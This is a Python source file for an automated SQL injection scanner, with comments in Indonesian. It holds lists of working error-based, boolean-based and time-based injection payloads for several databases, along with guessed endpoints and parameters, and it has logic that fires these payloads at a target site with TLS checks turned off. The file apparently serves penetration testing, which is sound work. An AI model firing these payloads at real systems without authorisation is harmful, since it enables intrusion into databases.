# checker/sqli.py — SQLInjectionChecker v3
import re
import time
import requests as _requests
import threading
import urllib3
from typing import Dict, Any, Optional, List
from urllib.parse import urljoin, quote, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from helpers.http_client import HttpClient, HostDeadException
from helpers.waf_checker import WAFChecker
from helpers.spa_crawler import SPACrawler
from helpers.scope import is_in_scope
from helpers.parsers import (
    is_spa_html, spa_confidence,
    extract_forms, extract_paths_from_js,
    extract_all_js_paths, normalize_url,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Terminal output helpers ───────────────────────────────────────────────────

import sys as _sys

def _safe_print(msg: str):
    try:
        print(msg)
    except Exception:
        pass  # Ignore write errors during interpreter shutdown

def _info(msg: str):  _safe_print(f"  [*] {msg}")
def _ok(msg: str):    _safe_print(f"  [+] {msg}")
def _warn(msg: str):  _safe_print(f"  [!] {msg}")
def _step(n: int, total: int, msg: str): _safe_print(f"\n  [{n}/{total}] {msg}")


# ── HTTP Headers ──────────────────────────────────────────────────────────────

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,*/*',
}

JSON_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, */*',
    'X-Requested-With': 'XMLHttpRequest',
}


# ── Payloads ──────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    '"',
    "' --",
    "') --",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=CONVERT(int,'a')--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

BOOL_PAIRS = [
    ("XNOTEXISTX' OR '1'='1'--",  "XNOTEXISTX' OR '1'='2'--"),
    ("XNOTEXISTX' OR 1=1--",      "XNOTEXISTX' OR 1=2--"),
    ("XNOTEXISTX' OR 'a'='a'--",  "XNOTEXISTX' OR 'a'='b'--"),
    ("0 OR 1=1",                  "0 OR 1=2"),
    ("0) OR (1=1",                "0) OR (1=2"),
]

TIME_PAYLOADS_ALL = {
    "MySQL": [
        ("' OR SLEEP(5)--",                  "MySQL"),
        ("' AND SLEEP(5)--",                 "MySQL"),
        ("' OR (SELECT SLEEP(5))--",         "MySQL"),
        ("1 OR SLEEP(5)--",                  "MySQL"),
    ],
    "SQLite": [
        ("' AND (SELECT HEX(RANDOMBLOB(50000000)))!=''--",                          "SQLite"),
        ("' OR (SELECT HEX(RANDOMBLOB(50000000)))!=''--",                           "SQLite"),
        ("' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master m2,sqlite_master m3)>0--", "SQLite"),
    ],
    "PostgreSQL": [
        ("' OR (SELECT pg_sleep(5)) IS NOT NULL--",  "PostgreSQL"),
        ("' AND (SELECT pg_sleep(5)) IS NOT NULL--", "PostgreSQL"),
        ("'||(SELECT pg_sleep(5))||'",               "PostgreSQL"),
    ],
    "MSSQL": [
        ("' WAITFOR DELAY '0:0:5'--",  "MSSQL"),
        ("'; WAITFOR DELAY '0:0:5'--", "MSSQL"),
    ],
    "Oracle": [
        ("' OR 1=1 AND (SELECT COUNT(*) FROM ALL_OBJECTS)>0--", "Oracle"),
    ],
    "Unknown": [
        ("' OR SLEEP(5)--",                          "MySQL"),
        ("' AND (SELECT HEX(RANDOMBLOB(50000000)))!=''--", "SQLite"),
        ("' OR (SELECT pg_sleep(5)) IS NOT NULL--",  "PostgreSQL"),
        ("' WAITFOR DELAY '0:0:5'--",                "MSSQL"),
    ],
}

DB_ERROR_SIGNATURES = {
    'sqlite3.operationalerror':   'SQLite',
    'operationalerror':           'SQLite',
    'sqlite_master':              'SQLite',
    'unrecognized token':         'SQLite',
    'no such table':              'SQLite',
    'no such column':             'SQLite',
    'sqlalche.me':                'SQLite',
    'sql: select':                'SQLite',
    'incomplete input':           'SQLite',
    'you have an error in your sql syntax': 'MySQL',
    'warning: mysql':             'MySQL',
    'mysql_fetch':                'MySQL',
    'supplied argument is not a valid mysql': 'MySQL',
    'mysql_num_rows':             'MySQL',
    'pg_query()':                 'PostgreSQL',
    'pg_exec()':                  'PostgreSQL',
    'unterminated quoted string': 'PostgreSQL',
    'pgsql error':                'PostgreSQL',
    'microsoft sql server':       'MSSQL',
    'unclosed quotation mark':    'MSSQL',
    'syntax error converting':    'MSSQL',
    'odbc sql server':            'MSSQL',
    'ora-01756':                  'Oracle',
    'ora-00933':                  'Oracle',
    'oracle error':               'Oracle',
    'sql syntax':                 'Unknown',
    'sql error':                  'Unknown',
    'database error':             'Unknown',
    'query failed':               'Unknown',
    'pdoexception':               'Unknown',
    'sqlstate':                   'Unknown',
    'syntax error':               'Unknown',
}

TEST_ENDPOINTS = [
    '/search', '/products', '/items', '/users',
    '/profile', '/article', '/news', '/category',
    '/login', '/api/search', '/api/products',
    '/api/users', '/api/items', '/api/posts',
    '/api/posts/search', '/posts/search',
    '/api/articles', '/api/comments', '/api/categories',
]

API_SQLI_SUFFIXES = [
    '/search', '/find', '/query', '/filter',
    '/list', '/detail', '/get',
    '/posts/search', '/users/search', '/items/search',
]

TEST_PARAMS = [
    'q', 'id', 'search', 'query', 'keyword',
    'name', 'user', 'item', 'filter', 'cat',
    'page', 'sort', 'order', 'key', 'term',
    'username', 'email', 'title', 'slug', 'tag',
]


# ── Severity ──────────────────────────────────────────────────────────────────

SEVERITY_VULN_KEY: dict[str, str] = {
    'CRITICAL': 'SQLI_CRITICAL',
    'HIGH':     'SQLI_HIGH',
    'MEDIUM':   'SQLI_MEDIUM',
    'LOW':      'SQLI_LOW',
}

_AUTH_PATHS = {'login', 'signin', 'auth', 'oauth', 'callback', 'register', 'admin'}

# Error-based pada db spesifik -> HIGH/CRITICAL
_CRITICAL_DB_ERRORS = {'MySQL', 'PostgreSQL', 'MSSQL', 'Oracle'}


def _classify_severity(sqli_type: str, db_type: str, url: str) -> str:
    parsed_path = urlparse(url).path.lower()
    is_auth     = any(kw in parsed_path for kw in _AUTH_PATHS)

    if sqli_type == 'error-based':
        if db_type in _CRITICAL_DB_ERRORS or is_auth:
            return 'CRITICAL'
        return 'HIGH'

    if sqli_type == 'boolean-based':
        return 'CRITICAL' if is_auth else 'HIGH'

    if sqli_type == 'time-based':
        return 'HIGH'

    # form scan
    if 'form' in sqli_type:
        if db_type in _CRITICAL_DB_ERRORS or is_auth:
            return 'CRITICAL'
        return 'HIGH'

    return 'MEDIUM'


# ── Helpers ───────────────────────────────────────────────────────────────────

def _raw_get(url: str, timeout: int = 8, **kwargs):
    try:
        return _requests.get(url, timeout=timeout, verify=False,
                             allow_redirects=True, **kwargs)
    except Exception:
        return None


def _raw_post(url: str, timeout: int = 8, **kwargs):
    try:
        return _requests.post(url, timeout=timeout, verify=False,
                              allow_redirects=True, **kwargs)
    except Exception:
        return None


def _enc(payload: str) -> str:
    return quote(payload, safe='')


# ── Main class ────────────────────────────────────────────────────────────────

class SQLInjectionChecker:
    def __init__(
        self,
        url: str,
        timeout: float = 5.0,
        extra_paths: Optional[List[str]] = None,
        cookies: Optional[Dict] = None,
        scope_mode: str = 'wildcard',
        discovered: Optional[Dict] = None,
    ):
        self.base_url            = url.rstrip('/')
        self.timeout             = int(timeout)
        self.extra_paths         = extra_paths or []
        self.cookies             = cookies or {}
        self.scope_mode          = scope_mode
        self.discovered          = discovered or {}
        self._found_urls: set    = set()
        self._lock               = threading.Lock()
        self._detected_db: str   = 'Unknown'
        self._vuln_found         = threading.Event()

        self._waf_detected       = self.discovered.get('waf_detected', False)
        self._waf_info           = self.discovered.get('waf_info', {})
        self._api_bases: List    = self.discovered.get('api_bases', [])

        self._client = HttpClient(
            timeout=self.timeout,
            headers=HEADERS,
            cookies=self.cookies,
            verify=False,
            retries=0,  # Tidak retry — tarpit WAF akan memperlambat scan
        )

    # ── Utils ─────────────────────────────────────────────────────────────────

    def _is_cloudflare_page(self, text: str) -> bool:
        return WAFChecker.is_cloudflare_page(text)

    # ── Endpoint discovery ────────────────────────────────────────────────────

    def _get_active_endpoints(self) -> List[str]:
        active = []
        for ep in self.discovered.get('endpoints', []):
            if ep not in active:
                active.append(ep)
                
        # API Candidates
        for base in self._api_bases:
            for suffix in API_SQLI_SUFFIXES:
                full = (base.rstrip('/') + suffix) if base.startswith('http') else (base + suffix)
                if full not in active:
                    active.append(full)
                    
        for p in TEST_ENDPOINTS:
            url = urljoin(self.base_url, p)
            if url not in active:
                active.append(url)
                
        for path in self.extra_paths:
            full = normalize_url(path, self.base_url)
            if full not in active:
                active.append(full)
                
        return list(dict.fromkeys(active))

    # ── Endpoint pre-filter ──────────────────────────────────────────────────

    def _prefilter_endpoints(self, endpoints: List[str]) -> List[str]:
        """Quick filter: remove endpoints returning 404/410 to avoid wasting time."""
        live = []

        def _check(url):
            if self._vuln_found.is_set():
                return None
            try:
                r = _raw_get(url, timeout=4, headers=HEADERS)
                if r and r.status_code not in (404, 410):
                    return url
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=15) as ex:
            futures = [ex.submit(_check, url) for url in endpoints]
            for f in as_completed(futures):
                try:
                    result = f.result()
                    if result:
                        live.append(result)
                except Exception:
                    pass

        return live

    # ── Core check helpers ────────────────────────────────────────────────────

    def _check_sqli_body(self, body: str, url: str, param: str,
                         payload: str, status: int, results: Dict, tag: str) -> bool:
        body_lower  = body.lower()
        matched_sig = None
        matched_db  = 'Unknown'

        for sig, db in DB_ERROR_SIGNATURES.items():
            if sig in body_lower:
                matched_sig = sig
                matched_db  = db
                break

        if not matched_sig:
            return False

        if matched_db != 'Unknown':
            with self._lock:
                self._detected_db = matched_db

        key = f"{tag}:{url}:{param}"
        registered = False
        with self._lock:
            if key not in self._found_urls:
                self._found_urls.add(key)
                registered = True

        if registered:
            vuln_url = f"{url}?{param}={payload}"
            severity = _classify_severity(tag.lower(), matched_db, url)
            parsed   = urlparse(url)

            _warn(f"SQLi {tag} [{severity}] -> param={param} | db={matched_db} | status={status}")
            with self._lock:
                results['vulnerable_paths'].append({
                    'url':          vuln_url,
                    'path':         parsed.path,
                    'base':         f"{parsed.scheme}://{parsed.netloc}",
                    'param':        param,
                    'payload':      payload,
                    'type':         tag.lower(),
                    'signature':    matched_sig,
                    'db_type':      matched_db,
                    'severity':     severity,
                    'vuln_key':     SEVERITY_VULN_KEY.get(severity),
                    'file_count':   0,
                    'dir_count':    0,
                    'notable_files': [],
                    'is_nested':    False,
                })
                if not results['db_type']:
                    results['db_type'] = matched_db
        return True

    # ── Error-based ───────────────────────────────────────────────────────────

    def _error_based(self, url: str, param: str, results: Dict) -> bool:
        response_sigs = []  # Track (status, body_len) for smart skip
        for payload in ERROR_PAYLOADS:
            with self._lock:
                results['total_tested'] += 1
            r = _raw_get(f"{url}?{param}={_enc(payload)}",
                         timeout=self.timeout, headers=JSON_HEADERS)
            if not r:
                continue
            if self._is_cloudflare_page(r.text):
                return False  # WAF blocks -> skip remaining payloads
            
            if self._check_sqli_body(r.text, url, param, payload,
                                     r.status_code, results, 'Error-based'):
                return True

            # Smart skip: if first 3 responses are nearly identical,
            # the endpoint doesn't process this param -> skip rest
            response_sigs.append((r.status_code, len(r.text)))
            if len(response_sigs) == 3:
                statuses = {s for s, _ in response_sigs}
                lengths = [l for _, l in response_sigs]
                if len(statuses) == 1 and (max(lengths) - min(lengths)) < 50:
                    return False
        return False

    # ── Boolean-based ─────────────────────────────────────────────────────────

    def _boolean_based(self, url: str, param: str, results: Dict) -> bool:
        if self._vuln_found.is_set():
            return False
        try:
            r_empty = _raw_get(f"{url}?{param}=XNOTEXISTX999",
                               timeout=self.timeout, headers=JSON_HEADERS)
            if not r_empty or self._is_cloudflare_page(r_empty.text):
                return False
                
            empty_len = len(r_empty.text)

            for true_p, false_p in BOOL_PAIRS:
                with self._lock:
                    results['total_tested'] += 2

                r_true  = _raw_get(f"{url}?{param}={_enc(true_p)}",
                                   timeout=self.timeout, headers=JSON_HEADERS)
                r_false = _raw_get(f"{url}?{param}={_enc(false_p)}",
                                   timeout=self.timeout, headers=JSON_HEADERS)
                if not r_true or not r_false:
                    continue

                len_true       = len(r_true.text)
                len_false      = len(r_false.text)
                true_vs_empty  = abs(len_true - empty_len)
                false_vs_empty = abs(len_false - empty_len)
                ratio          = len_true / max(empty_len, 1)

                bool_detected = (
                    (true_vs_empty > 100 and false_vs_empty < 80) or
                    (ratio > 3.0 and false_vs_empty < 80 and true_vs_empty > 50)
                )

                if bool_detected:
                    confirmed = self._confirm_boolean(url, param, empty_len)
                    if not confirmed:
                        continue

                    key = f"Boolean-based:{url}:{param}"
                    registered = False
                    with self._lock:
                        if key not in self._found_urls:
                            self._found_urls.add(key)
                            registered = True
                    if registered:
                        _warn(f"SQLi Boolean-based -> param={param} | "
                              f"true={len_true}b empty={empty_len}b ratio={ratio:.1f}x")
                        db       = results.get('db_type') or self._detected_db or 'Unknown'
                        severity = _classify_severity('boolean-based', db, url)
                        parsed   = urlparse(url)

                        with self._lock:
                            results['vulnerable_paths'].append({
                                'url':          f"{url}?{param}={true_p}",
                                'path':         parsed.path,
                                'base':         f"{parsed.scheme}://{parsed.netloc}",
                                'param':        param,
                                'payload':      true_p,
                                'type':         'boolean-based',
                                'signature':    f'true={len_true}b vs empty={empty_len}b '
                                               f'(ratio={ratio:.1f}, diff={true_vs_empty}b)',
                                'db_type':      db,
                                'severity':     severity,
                                'vuln_key':     SEVERITY_VULN_KEY.get(severity),
                                'file_count':   0,
                                'dir_count':    0,
                                'notable_files': [],
                                'is_nested':    False,
                            })
                            if not results['db_type']:
                                results['db_type'] = db
                    return True
        except HostDeadException:
            raise
        except Exception:
            pass
        return False

    def _confirm_boolean(self, url: str, param: str, empty_len: int) -> bool:
        confirm_pair = ("XNOTEXISTX' OR 'x'='x'--", "XNOTEXISTX' OR 'x'='y'--")
        r_t = _raw_get(f"{url}?{param}={_enc(confirm_pair[0])}",
                       timeout=self.timeout, headers=JSON_HEADERS)
        r_f = _raw_get(f"{url}?{param}={_enc(confirm_pair[1])}",
                       timeout=self.timeout, headers=JSON_HEADERS)
        if not r_t or not r_f:
            return False
        len_t = len(r_t.text)
        len_f = len(r_f.text)
        return abs(len_t - empty_len) > 100 and abs(len_f - empty_len) < 80

    # ── Time-based ────────────────────────────────────────────────────────────

    def _time_based(self, url: str, param: str, results: Dict) -> bool:
        if self._vuln_found.is_set():
            return False
        # Single baseline measurement (reduced from 3 to speed up scan)
        try:
            t0 = time.time()
            _raw_get(f"{url}?{param}=normalquery",
                     timeout=8, headers=JSON_HEADERS)
            baseline = max(time.time() - t0, 0.3)
        except Exception:
            return False

        detected_db    = self._detected_db or 'Unknown'
        payloads_to_try = TIME_PAYLOADS_ALL.get(detected_db, TIME_PAYLOADS_ALL['Unknown'])

        for payload, db_hint in payloads_to_try:
            with self._lock:
                results['total_tested'] += 1
            try:
                t1      = time.time()
                _raw_get(f"{url}?{param}=1{_enc(payload)}",
                         timeout=20, headers=JSON_HEADERS)
                elapsed = time.time() - t1
                delta   = elapsed - baseline

                if elapsed >= 4.5 and delta >= 3.5:
                    key = f"Time-based:{url}:{param}"
                    registered = False
                    with self._lock:
                        if key not in self._found_urls:
                            self._found_urls.add(key)
                            registered = True
                    if registered:
                        _warn(f"SQLi Time-based -> param={param} | "
                              f"delay={elapsed:.1f}s Δ+{delta:.1f}s | db={db_hint}")
                        severity = _classify_severity('time-based', db_hint, url)
                        parsed   = urlparse(url)

                        with self._lock:
                            results['vulnerable_paths'].append({
                                'url':          f"{url}?{param}=1{payload}",
                                'path':         parsed.path,
                                'base':         f"{parsed.scheme}://{parsed.netloc}",
                                'param':        param,
                                'payload':      payload,
                                'type':         'time-based',
                                'signature':    f'delay {elapsed:.1f}s '
                                               f'(Δ+{delta:.1f}s vs baseline {baseline:.2f}s)',
                                'db_type':      db_hint,
                                'severity':     severity,
                                'vuln_key':     SEVERITY_VULN_KEY.get(severity),
                                'file_count':   0,
                                'dir_count':    0,
                                'notable_files': [],
                                'is_nested':    False,
                            })
                            if not results['db_type']:
                                results['db_type'] = db_hint
                    return True

            except _requests.exceptions.Timeout:
                key = f"Time-based:{url}:{param}"
                registered = False
                with self._lock:
                    if key not in self._found_urls:
                        self._found_urls.add(key)
                        registered = True
                if registered:
                    _warn(f"SQLi Time-based (timeout >20s) -> param={param} | db={db_hint}")
                    severity = _classify_severity('time-based', db_hint, url)
                    parsed   = urlparse(url)

                    with self._lock:
                        results['vulnerable_paths'].append({
                            'url':          f"{url}?{param}=1{payload}",
                            'path':         parsed.path,
                            'base':         f"{parsed.scheme}://{parsed.netloc}",
                            'param':        param,
                            'payload':      payload,
                            'type':         'time-based',
                            'signature':    'request timeout >20s',
                            'db_type':      db_hint,
                            'severity':     severity,
                            'vuln_key':     SEVERITY_VULN_KEY.get(severity),
                            'file_count':   0,
                            'dir_count':    0,
                            'notable_files': [],
                            'is_nested':    False,
                        })
                        if not results['db_type']:
                            results['db_type'] = db_hint
                return True
            except HostDeadException:
                raise
            except Exception:
                pass
        return False

    # ── Scan per endpoint ─────────────────────────────────────────────────────

    def _scan_endpoint(self, url: str, results: Dict):

        # Quick probe: check if endpoint processes query params at all
        # If response is identical with/without a random param, skip it
        try:
            r_bare  = _raw_get(url, timeout=4, headers=JSON_HEADERS)
            r_probe = _raw_get(f"{url}?__dsProbe__=xyz123", timeout=4, headers=JSON_HEADERS)
            if (r_bare and r_probe
                    and r_bare.status_code == r_probe.status_code
                    and abs(len(r_bare.text) - len(r_probe.text)) < 30):
                # Endpoint returns identical response -> likely SPA/static/catch-all
                # Only test top 3 most common injectable params
                all_params = list(dict.fromkeys(
                    TEST_PARAMS + self.discovered.get('params', [])
                ))[:3]
            else:
                all_params = list(dict.fromkeys(
                    TEST_PARAMS + self.discovered.get('params', [])
                ))
        except Exception:
            all_params = list(dict.fromkeys(
                TEST_PARAMS + self.discovered.get('params', [])
            ))

        def _test_param(param):
            if self._error_based(url, param, results):
                pass
            if self._boolean_based(url, param, results):
                pass

        with ThreadPoolExecutor(max_workers=5) as ex:
            futures = [ex.submit(_test_param, p) for p in all_params]
            for f in as_completed(futures):
                try:
                    f.result()
                except HostDeadException:
                    for rem in futures:
                        rem.cancel()
                    raise
                except Exception:
                    pass

    def _scan_forms(self, results: Dict):
        forms = self.discovered.get('forms', [])
        if not forms:
            return
            
        for form in forms:
            for inp in form['inputs']:
                param  = inp['name']
                action = form['action']
                for payload in ERROR_PAYLOADS:
                    with self._lock:
                        results['total_tested'] += 1
                    if form['method'] == 'post':
                        r = _raw_post(action, timeout=self.timeout,
                                      data={param: payload}, headers=JSON_HEADERS)
                    else:
                        r = _raw_get(f"{action}?{param}={_enc(payload)}",
                                     timeout=self.timeout, headers=JSON_HEADERS)
                    if not r or self._is_cloudflare_page(r.text):
                        continue
                    
                    if self._check_sqli_body(r.text, action, param, payload,
                                             r.status_code, results,
                                             'Error-based (form)'):
                        break

    # ── Main run ──────────────────────────────────────────────────────────────

    def run(self) -> Dict[str, Any]:
        results = {
            'vulnerable':       False,
            'vulnerable_paths': [],         
            'db_type':          None,
            'total_tested':     0,
            'findings':         [],
            'error':            None,
            'summary':          {},         
            'waf_detected':     self._waf_detected,
        }

        try:
            results['waf_info']     = self._waf_info
            
            _step(1, 4, "Mengumpulkan endpoint ...")
            raw_endpoints = self._get_active_endpoints()
            _info(f"Total {len(raw_endpoints)} endpoint kandidat")

            _step(2, 4, "Pre-filter endpoint (skip 404) ...")
            active_endpoints = self._prefilter_endpoints(raw_endpoints)
            _info(f"{len(active_endpoints)} endpoint aktif (dari {len(raw_endpoints)} kandidat)")

            _step(3, 4, "Error-based & Boolean-based scan ...")
            with ThreadPoolExecutor(max_workers=10) as ex:
                futures = [
                    ex.submit(self._scan_endpoint, url, results)
                    for url in active_endpoints
                ]
                for f in as_completed(futures):
                    try: f.result()
                    except HostDeadException:
                        for rem in futures:
                            rem.cancel()
                        break
                    except Exception: pass

            if not results['vulnerable_paths']:
                _step(4, 4, "Time-based scan ...")
                all_params = list(dict.fromkeys(TEST_PARAMS + self.discovered.get('params', [])))
                time_endpoints = active_endpoints[:10]  # Limit to top 10 endpoints
                _info(f"Time-based: {len(time_endpoints)} endpoint × {min(len(all_params), 3)} param")
                for url in time_endpoints:
                    for param in all_params[:3]:  # Top 3 params only
                        self._time_based(url, param, results)
            else:
                _step(4, 4, "Time-based dilewati (sudah ada temuan)")

            self._scan_forms(results)

            # ── Finalize + summary ────────────────────────────────────────────
            if results['vulnerable_paths']:
                results['vulnerable'] = True
                count = len(results['vulnerable_paths'])

                sev_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
                type_count: Dict[str, int] = {}
                for vp in results['vulnerable_paths']:
                    sev = vp.get('severity', 'MEDIUM')
                    sev_count[sev] = sev_count.get(sev, 0) + 1
                    t = vp.get('type', 'unknown')
                    type_count[t] = type_count.get(t, 0) + 1

                results['summary'] = {
                    'total_vulnerable_paths': count,
                    'db_type':                results['db_type'],
                    'severity_breakdown':     {k: v for k, v in sev_count.items() if v > 0},
                    'type_breakdown':         type_count,
                    'waf_detected':           results['waf_detected'],
                }

                results['findings'].append(
                    f"SQL Injection ditemukan pada {count} parameter."
                )
                for v in results['vulnerable_paths']:
                    results['findings'].append(
                        f"  -> [{v['type']}][{v.get('severity','?')}] {v['url']} "
                        f"(param: {v['param']}, db: {v['db_type']})"
                    )
                _ok(
                    f"Total: {count} SQLi | "
                    f"CRITICAL={sev_count.get('CRITICAL',0)} "
                    f"HIGH={sev_count.get('HIGH',0)} "
                    f"MEDIUM={sev_count.get('MEDIUM',0)}"
                )
            else:
                results['findings'].append("Tidak ditemukan indikasi SQL Injection.")

        except Exception as e:
            results['error'] = str(e)
        finally:
            self._client.close()

        return results